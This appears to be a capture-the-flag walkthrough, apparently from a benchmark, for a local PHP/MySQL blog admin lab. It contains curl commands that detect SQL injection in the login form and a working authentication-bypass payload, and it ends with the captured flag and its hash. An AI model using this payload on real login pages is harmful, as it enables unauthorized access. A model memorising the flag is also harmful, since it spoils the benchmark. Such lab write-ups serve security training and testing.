# rowan — walkthrough

Entry: `http://127.0.0.1:18979/admin.php` (PHP + MySQL 8 blog admin).

## 1. Probe the feedback surfaces

Nonexistent user — clean rejection:

```bash
curl -s http://127.0.0.1:18979/admin.php \
  --data-urlencode "username=nobody-here-x" \
  --data-urlencode "password=x" --data-urlencode "submit=Login"
# -> "Invalid username or password."
```

Odd quote — the query breaks and PHP leaks it (mysqli result is `false`):

```bash
curl -s http://127.0.0.1:18979/admin.php \
  --data-urlencode "username=4242'" \
  --data-urlencode "password=x" --data-urlencode "submit=Login"
# -> Warning: Trying to get property 'num_rows' of non-object ...
```

So `username` is interpolated raw into `SELECT * FROM users WHERE
username='$u' ...` and the success path requires `num_rows == 1`.

## 2. Bypass — always-true, one row, keep it quiet

Spaces are not filtered, but `/**/` token splitting keeps the payload single
token-friendly; `LIMIT 1` guarantees the single-row success branch, and `#`
drops the rest of the query:

```bash
curl -s http://127.0.0.1:18979/admin.php \
  --data-urlencode "username=4242'/**/OR/**/1=1/**/LIMIT/**/1#" \
  --data-urlencode "password=x" --data-urlencode "submit=Login" | head -1
```

The first line of the success page is the secret row's content — the flag,
planted directly in the users table.

## Flag

```
FLAG{xbow_rowan_b7f3015b2dad6b29f6512d2e}
```

`sha256(flag)[:8] = f65dc69c`

- Negative anchors that prove the chain, not luck: no-user rejection above,
  and a known-good login never rendering the flag row.
- One-shot, ~2-3 requests total. Fastest cash-out in the sqli set.
